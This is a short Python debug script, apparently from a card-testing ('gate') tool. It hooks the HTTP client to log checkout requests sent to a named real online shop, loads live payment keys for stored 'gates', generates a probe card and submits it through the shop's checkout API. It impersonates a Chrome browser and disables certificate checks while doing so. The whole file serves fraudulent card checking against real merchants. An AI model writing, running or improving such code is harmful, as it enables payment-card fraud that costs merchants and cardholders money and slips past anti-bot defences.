# language: python, file: scratch/_debug_raw2.py — перехват всех POST /checkout из движка на herbaura
import asyncio
import sys

from curl_cffi.requests import AsyncSession

import gate_client as gc

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

_orig_post = AsyncSession.post
n = [0]


async def patched_post(self, url, **kw):
    if "/checkout" in str(url) and kw.get("json"):
        n[0] += 1
        r = await _orig_post(self, url, **kw)
        print(f"\n>>> POST #{n[0]} pm={kw['json'].get('payment_method')}")
        print(f"    -> {r.status_code} len={len(r.text)}")
        if r.status_code == 200:
            import json as _j
            try:
                dd = _j.loads(r.text)
                print("    keys:", list(dd.keys()))
                print("    payment_result:", _j.dumps(dd.get("payment_result"),
                                                     ensure_ascii=False)[:400])
            except Exception as e:
                print("    parse fail:", e)
        return r
    return await _orig_post(self, url, **kw)


AsyncSession.post = patched_post


async def main():
    root = "https://herbaura.fr"
    gates_pk = ""
    import json
    for g in json.load(open("data/store_gates.json", encoding="utf-8")):
        if g["base_url"] == root:
            gates_pk = g.get("pk_live", "")
    probe = gc.gen_probe_card()
    card_raw = f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        res = await gc.store_api_confirm(s, root, gates_pk, card_raw, country="US",
                                         max_price_cents=3000)
    print("\nRESULT:", res.get("status"), "|", str(res.get("detail"))[:120])


if __name__ == "__main__":
    asyncio.run(main())
